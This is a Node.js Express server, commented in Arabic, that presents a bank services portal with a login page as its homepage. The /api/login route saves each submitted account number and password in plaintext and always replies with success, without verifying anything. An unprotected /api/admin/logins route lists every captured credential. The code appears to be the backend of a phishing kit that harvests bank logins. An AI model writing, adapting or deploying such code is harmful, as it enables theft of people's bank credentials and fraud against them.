const express = require("express");
const path = require("path");

const app = express();

const PORT = process.env.PORT || 3000;


// ========================================
// Middleware
// ========================================

app.use(express.json());
app.use(express.urlencoded({ extended: true }));


// ========================================
// تقديم ملفات الموقع
// ========================================

app.use(express.static(__dirname));


// ========================================
// الخدمات
// ========================================

const services = [
  {
    id: 1,
    name: "كشف الحساب",
    description: "الحصول على كشف حساب مفصل.",
    icon: "fa-file-invoice"
  },
  {
    id: 2,
    name: "رفع السقف",
    description: "زيادة الحد اليومي للتحويلات.",
    icon: "fa-arrow-up-right-dots"
  },
  {
    id: 3,
    name: "التحويلات الخاطئة",
    description: "معالجة التحويلات التي تمت بالخطأ.",
    icon: "fa-right-left"
  },
  {
    id: 4,
    name: "خدمات العملات الأجنبية",
    description: "خدمات وإجراءات العملات الأجنبية.",
    icon: "fa-money-bill-transfer"
  },
  {
    id: 5,
    name: "بطاقة فيزا افتراضية",
    description: "خدمات البطاقة الافتراضية.",
    icon: "fa-credit-card"
  },
  {
    id: 6,
    name: "تغيير رقم الهاتف القديم إلى رقم هاتف جديد",
    description: "تقديم طلب لتغيير رقم الهاتف المرتبط بالحساب.",
    icon: "fa-phone"
  },
  {
    id: 7,
    name: "تفعيل أسئلة الأمان",
    description: "تفعيل وإدارة أسئلة الأمان والحماية.",
    icon: "fa-shield-halved"
  },
  {
    id: 8,
    name: "إثبات دخل",
    description: "تقديم مستندات إثبات الدخل.",
    icon: "fa-file-signature"
  }
];


// ========================================
// تخزين الطلبات مؤقتاً
// ========================================

let requests = [];
let loginData = []; // لتخزين بيانات تسجيل الدخول


// ========================================
// المسارات (Routes)
// ========================================

// جعل صفحة تسجيل الدخول هي الصفحة الرئيسية
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "login.html"));
});

// مسار صفحة الخدمات
app.get("/index.html", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// مسار صفحة النجاح
app.get("/success.html", (req, res) => {
  res.sendFile(path.join(__dirname, "success.html"));
});


// ========================================
// APIs
// ========================================

// API تسجيل الدخول (لحفظ البيانات)
app.post("/api/login", (req, res) => {
  const { accountNumber, password } = req.body;
  
  if (!accountNumber || !password) {
    return res.status(400).json({ success: false, message: "يرجى إدخال جميع البيانات" });
  }

  loginData.push({
    accountNumber,
    password,
    timestamp: new Date().toISOString()
  });

  res.json({ success: true, message: "تم تسجيل الدخول بنجاح" });
});

// API عرض جميع الخدمات
app.get("/api/services", (req, res) => {
  res.json({
    success: true,
    services: services
  });
});

// API إرسال طلب جديد
app.post("/api/requests", (req, res) => {
  const { serviceId, serviceName } = req.body;

  if (!serviceId && !serviceName) {
    return res.status(400).json({ success: false, message: "يرجى اختيار الخدمة أولاً" });
  }

  let selectedService = services.find(item => item.id === Number(serviceId) || item.name === serviceName);

  if (!selectedService) {
    return res.status(404).json({ success: false, message: "الخدمة المطلوبة غير موجودة" });
  }

  const newRequest = {
    id: requests.length > 0 ? requests[requests.length - 1].id + 1 : 1,
    serviceId: selectedService.id,
    serviceName: selectedService.name,
    status: "جديد",
    createdAt: new Date().toISOString()
  };

  requests.push(newRequest);

  res.status(201).json({
    success: true,
    message: "تم إرسال طلبك بنجاح",
    request: newRequest
  });
});

// API للأدمن لعرض بيانات تسجيل الدخول (اختياري)
app.get("/api/admin/logins", (req, res) => {
  res.json({ success: true, total: loginData.length, logins: loginData });
});

app.get("/api/admin/requests", (req, res) => {
  res.json({ success: true, total: requests.length, requests: requests });
});

// ========================================
// تشغيل السيرفر
// ========================================

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
